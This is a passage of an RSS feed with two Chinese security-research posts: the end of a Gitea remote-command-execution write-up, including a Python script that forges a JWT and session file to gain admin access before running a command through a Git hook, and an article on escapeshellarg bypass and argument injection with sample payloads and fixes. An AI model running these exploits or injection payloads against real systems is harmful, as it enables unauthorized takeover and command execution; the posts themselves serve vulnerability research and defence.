SESSION_DATA = bytes.fromhex(&#39;0eff81040102ff82000110011000005cff82000306737472696e670c0a00085f6f6c645f75696406737472696e670c0300013106737472696e670c05000375696405696e7436340402000206737472696e670c070005756e616d6506737472696e670c08000676756c687562&#39;)
 
 
def generate_token():
  def decode_base64(data):
  missing_padding = len(data) % 4
  if missing_padding != 0:
  data += &#39;=&#39;* (4 - missing_padding)
  return base64.urlsafe_b64decode(data)
 
  nbf = int(time.time())-(60*60*24*1000)
  exp = int(time.time())+(60*60*24*1000)
 
  token = jwt.encode({&#39;user&#39;: USER_ID, &#39;repo&#39;: REPO_ID, &#39;op&#39;: &#39;upload&#39;, &#39;exp&#39;: exp, &#39;nbf&#39;: nbf}, decode_base64(JWT_SECRET), algorithm=&#39;HS256&#39;)
  return token.decode()
 
def gen_data():
  yield SESSION_DATA
  time.sleep(300)
  yield b&#39;&#39;
 
 
OID = f&#39;....gitea/sessions/{SESSION_ID[0]}/{SESSION_ID[1]}/{SESSION_ID}&#39;
response = requests.post(f&#39;{BASE_URL}.git/info/lfs/objects&#39;, headers={
  &#39;Accept&#39;: &#39;application/vnd.git-lfs+json&#39;
}, json={
  &quot;Oid&quot;: OID,
  &quot;Size&quot;: 100000,
  &quot;User&quot; : &quot;a&quot;,
  &quot;Password&quot; : &quot;a&quot;,
  &quot;Repo&quot; : &quot;a&quot;,
  &quot;Authorization&quot; : &quot;a&quot;
})
logging.info(response.text)
 
response = requests.put(f&quot;{BASE_URL}.git/info/lfs/objects/{quote(OID,
safe=&#39;&#39;)}&quot;, data=gen_data(), headers={
  &#39;Accept&#39;: &#39;application/vnd.git-lfs&#39;,
  &#39;Content-Type&#39;: &#39;application/vnd.git-lfs&#39;,
  &#39;Authorization&#39;: f&#39;Bearer {generate_token()}&#39;
 })
 &lt;/code&gt;&lt;p&gt;&lt;br&gt;这个脚本会将伪造的SESSION数据发送，并等待300秒后才关闭连接。在这300秒中，服务器上将存在一个名为“11vulhub.tmp”的文件，这也是session id。&lt;br&gt;带上这个session id，即可提升为管理员。&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9dda4f4e02021b5675b61871d00e8de4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;127&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9dda4f4e02021b5675b61871d00e8de4&quot; data-watermark-src=&quot;v2-7136e15e435578da17e4bb6dad48b71e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#hook&quot;&gt;漏洞六、利用HOOK执行任意命令&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;带上i_like_gitea=11vulhub.tmp这个Cookie，我们即可访问管理员账户。&lt;/p&gt;&lt;p&gt;然后随便找个项目，在设置中配置Git钩子。Git钩子是执行git命令的时候，会被自动执行的一段脚本。比如我这里用的pre-receive钩子，就是在commit之前会执行的脚本。我在其中加入待执行的命令touch /tmp/success：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0116e408d9f16943dbcd04281e42802e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;499&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0116e408d9f16943dbcd04281e42802e&quot; data-watermark-src=&quot;v2-550ed3d2be9de09fb12ef1f8d6b9b64f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;然后在网页端新建一个文件，点提交。进入docker容器，可见命令被成功执行：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4017029fca44f5c49c9db47e4c205686_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;499&quot; data-rawheight=&quot;90&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-4017029fca44f5c49c9db47e4c205686&quot; data-watermark-src=&quot;v2-ca1d8fa8d7a91e678ced68b07f33c4a6&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_4&quot;&gt;一些思考&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;整个漏洞链非常流畅，Go Web端的代码审计也非常少见，在传统漏洞越来越少的情况下，这些好思路将给安全研究者带来很多不一样的突破。&lt;br&gt;不过漏洞作者给出的POC实在是比较烂，基本离开了他自己的环境就不能用了，而且我也不建议用一键化的漏洞利用脚本来复现这个漏洞，原因是这个漏洞的利用涉及到一些不确定量，比如：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;gitea的$GITEA_CUSTOM，这个值影响到读取app.ini的那段POC&lt;/li&gt;&lt;li&gt;管理员的用户名和ID，这个可能需要猜。但其实我们也没必要必须伪造管理员的session，我们可以伪造任意一个用户的session，然后进入网站后再找找看看有没有管理员所创建的项目，如果有的话，就可以得知管理员的用户名了。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;另外，复现漏洞的时候也遇到过一些坑，比如gitea第一次安装好，如果不重启的话，他的session是存储在内存里的。只有第一次重启后，才会使用文件session，这一点需要注意。&lt;br&gt;如果目标系统使用的是sqlite做数据库，我们可以直接下载其数据库，并拿到他的密码哈希和另一个随机字符串，利用这两个值其实能直接伪造管理员的cookie（名为gitea_incredible），这一点我就不写了，大家可以自己查看文档。&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-07-16-39835913</guid>
<pubDate>Mon, 16 Jul 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>谈escapeshellarg绕过与参数注入漏洞</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-05-08-36591451.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/36591451&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b381f753958bcf64068ff996bf76ca7b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;参数注入漏洞是指，在执行命令的时候，用户控制了命令中的某个参数，并通过一些危险的参数功能，达成攻击的目的。&lt;/p&gt;&lt;h2&gt;0x01 从gitlist 0.6.0远程命令执行漏洞说起&lt;/h2&gt;&lt;p&gt;我们从gitlist说起，gitlist是一款使用PHP开发的图形化git仓库查看工具。在其0.6.0版本中，存在一处命令参数注入问题，可以导致远程命令执行漏洞。&lt;/p&gt;&lt;p&gt;在用户对仓库中代码进行搜索的时候，gitlist将调用&lt;code class=&quot;inline&quot;&gt;git grep&lt;/code&gt;命令：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;&amp;lt;?php
public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }
    $query = escapeshellarg($query);
    try {
        $results = $this-&amp;gt;getClient()-&amp;gt;run($this, &quot;grep -i --line-number {$query} $branch&quot;);
    } catch (\RuntimeException $e) {
        return false;
    }
&lt;/code&gt;&lt;p&gt;其中，&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;是搜索的关键字，&lt;code class=&quot;inline&quot;&gt;$branch&lt;/code&gt;是搜索的分支。&lt;/p&gt;&lt;p&gt;如果用户输入的&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;的值是&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager=id;&lt;/code&gt;，将可以执行&lt;code class=&quot;inline&quot;&gt;id&lt;/code&gt;命令：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-025b25bf8f104854898807714b9dac55_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;665&quot; data-rawheight=&quot;74&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;0x02 escapeshellarg为什么没有奏效？&lt;/h2&gt;&lt;p&gt;导致这个漏洞的原因，有几点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;开发者对于&lt;code class=&quot;inline&quot;&gt;escapeshellarg&lt;/code&gt;函数的误解，造成参数注入&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;git grep&lt;/code&gt;的参数&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager&lt;/code&gt;的值，将被直接执行&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;理论上，在经过&lt;code class=&quot;inline&quot;&gt;$query = escapeshellarg($query);&lt;/code&gt;处理后，&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;将变成一个由单引号包裹的字符串。但不出漏洞的前提是，这个字符串应该出现在“参数值”的位置，而不是出现在参数选项（option）中。&lt;/p&gt;&lt;p&gt;我们可以试一下如下命令：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master&lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9e039e85772fc4b3f1b3116e17c215c5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;700&quot; data-rawheight=&quot;168&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9e039e85772fc4b3f1b3116e17c215c5&quot; data-watermark-src=&quot;v2-c6f61d88a48b22311344485e716be6ab&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;如上图，我将&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;放在了&lt;code class=&quot;inline&quot;&gt;-e&lt;/code&gt;参数的值的位置，此时它就仅仅是一个字符串而已，并不会被当成参数&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;这应该作为本漏洞的最佳修复方法，也是git官方对pattern可能是用户输入的情况的一种解决方案（以下说明来自man-page）：&lt;/p&gt;&lt;blockquote&gt;-e &lt;br&gt;The next parameter is the pattern. This option has to be used for patterns starting with - and should be used in scripts passing user input to grep. Multiple patterns are combined by&lt;br&gt;or.&lt;/blockquote&gt;&lt;p&gt;当然，gitlist的开发者用了另一种修复方案：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;&amp;lt;?php
public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }
    $query = preg_replace(&#39;/(--?[A-Za-z0-9\-]+)/&#39;, &#39;&#39;, $query);
    $query = escapeshellarg($query);
    try {
        $results = $this-&amp;gt;getClient()-&amp;gt;run($this, &quot;grep -i --line-number -- {$query} $branch&quot;);
    } catch (\RuntimeException $e) {
        return false;
    }&lt;/code&gt;&lt;p&gt;首先用&lt;code class=&quot;inline&quot;&gt;preg_replace&lt;/code&gt;将&lt;code class=&quot;inline&quot;&gt;-&lt;/code&gt;开头的非法字符移除，然后将&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;拼接在&lt;code class=&quot;inline&quot;&gt;--&lt;/code&gt;的后面。&lt;/p&gt;&lt;p&gt;在命令行解析器中，&lt;code class=&quot;inline&quot;&gt;--&lt;/code&gt;的意思是，此后的部分不会再包含参数选项（option）：&lt;/p&gt;&lt;blockquote&gt;A -- signals the end of options and disables further option processing. Any arguments after the -- are treated as filenames and arguments. An argument of - is equivalent to --.&lt;br&gt;If arguments remain after option processing, and neither the -c nor the -s option has been supplied, the first argument is assumed to be the name of a file containing shell commands. If bash is invoked in this fashion, $0 is set to the name of the file, and the positional parameters are set to the remaining arguments. Bash reads and executes commands from this file, then exits. Bash&#39;s exit status is the exit status of the last command executed in the script. If no commands are executed, the exit status is 0. An attempt is first made to open the file in the current directory, and, if no file is found, then the shell searches the directories in PATH for the script.&lt;/blockquote&gt;&lt;p&gt;举个简单的例子，如果我们需要查看一个文件名是&lt;code class=&quot;inline&quot;&gt;--name&lt;/code&gt;的文件，我们就不能用&lt;code class=&quot;inline&quot;&gt;cat --name&lt;/code&gt;来读取，也不能用&lt;code class=&quot;inline&quot;&gt;cat &#39;--name&#39;&lt;/code&gt;，而必须要用&lt;code class=&quot;inline&quot;&gt;cat -- --name&lt;/code&gt;。从这个例子也能看出，单引号并不是区分一个字符串是“参数值”或“选项”的标准。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-294baf61c56ec7cfecbf9d00ddfb1ecc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;215&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-294baf61c56ec7cfecbf9d00ddfb1ecc&quot; data-watermark-src=&quot;v2-288a066ec9e202cacdac47f1babf7524&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所以官方这个修复方案也是可以接受的，只不过第一步的&lt;code class=&quot;inline&quot;&gt;preg_replace&lt;/code&gt;有点影响正常搜索功能。&lt;/p&gt;&lt;h2&gt;0x03 这不是PHP的专利&lt;/h2&gt;&lt;p&gt;熟悉PHP语言的同学一定对PHP执行命令的方法感受深刻，PHP内置的命令执行函数（如&lt;code class=&quot;inline&quot;&gt;shell_exec&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;system&lt;/code&gt;），都只接受一个“字符串”作为参数。而在内核中，这个字符串将被直接作为一条shell命令来调用，这种情况下就极为容易出现命令注入漏洞。&lt;/p&gt;&lt;p&gt;由于这个特点，PHP特别准备了两个过滤函数：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;escapeshellcmd&lt;/li&gt;&lt;li&gt;escapeshellarg&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;二者分工不同，前者为了防止用户利用shell的一些技巧（如分号、反引号等），执行其他命令；后者是为了防止用户的输入逃逸出“参数值”的位置，变成一个“参数选项”。&lt;/p&gt;&lt;p&gt;但我在0x02中也已经说清楚了，如果开发者在拼接命令的时候，将&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;直接给拼接在“参数选项”的位置上，那用escapeshellarg也就没任何效果了。&lt;/p&gt;&lt;p&gt;Java、Python等语言，执行命令的方法相对来说更加优雅：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;import subprocess

query = &#39;id&#39;
r = subprocess.run([&#39;git&#39;, &#39;grep&#39;, &#39;-i&#39;, &#39;--line-number&#39;, query, &#39;master&#39;], cwd=&#39;/tmp/vulhub&#39;)&lt;/code&gt;&lt;p&gt;默认情况下，python的subprocess接受的是一个列表。我们可以将用户输入的query放在列表的一项，这样也就避免了开发者手工转义query的工作，也能从根本上防御命令注入漏洞。但可惜的是，python帮开发者做的操作，也仅仅相当于是PHP中的escapeshellarg。我们可以试试令query等于&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager=id;&lt;/code&gt;：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-60e865d895273fd01be970c244f0dcca_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;794&quot; data-rawheight=&quot;176&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-60e865d895273fd01be970c244f0dcca&quot; data-watermark-src=&quot;v2-57cc73211fb0b0cb22c5fef181756722&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;可见，仍然是存在参数注入漏洞的。原因还是0x02中说的原因，你把query放在了“参数选项”的位置上，无论怎么过滤，或者换成其他语言，都不可能解决问题。&lt;/p&gt;&lt;h2&gt;0x04 举一反三&lt;/h2&gt;&lt;p&gt;参数注入的例子还比较多，因为大部分的开发者都能理解命令注入的原理，但处理了命令注入后，往往都会忽略参数注入的问题。&lt;/p&gt;&lt;p&gt;最典型是案例是&lt;a href=&quot;https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/README.md&quot;&gt;Wordpress PwnScriptum漏洞&lt;/a&gt;，PHP mail函数的第五个参数，允许直接注入参数，用户通过注入&lt;code class=&quot;inline&quot;&gt;-X&lt;/code&gt;参数，导致写入任意文件，最终getshell。&lt;/p&gt;&lt;p&gt;另一个典型的例子是&lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823&quot;&gt;php-cgi CVE-2012-1823&lt;/a&gt; ，在cgi模式中，用户传入的querystring将作为cgi的参数传给php-cgi命令。而php-cgi命令可以用-d参数指定配置项，我们通过指定&lt;code class=&quot;inline&quot;&gt;auto_prepend_file=php://input&lt;/code&gt;，最终导致任意代码执行。&lt;/p&gt;&lt;p&gt;客户端上也出现过类似的漏洞，比如&lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/electron/CVE-2018-1000006&quot;&gt;Electron CVE-2018-1000006&lt;/a&gt;，我们通过注入参数&lt;code class=&quot;inline&quot;&gt;--gpu-launcher=cmd.exe /c start calc&lt;/code&gt;，来让electron内置的chromium执行任意命令。electron的最早给出的缓解措施也是在拼接点前面加上“--”。&lt;/p&gt;</description>
<author>周佩雨</author>
<guid isPermaLink="false">2018-05-08-36591451</guid>
<pubDate>Tue, 08 May 2018 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
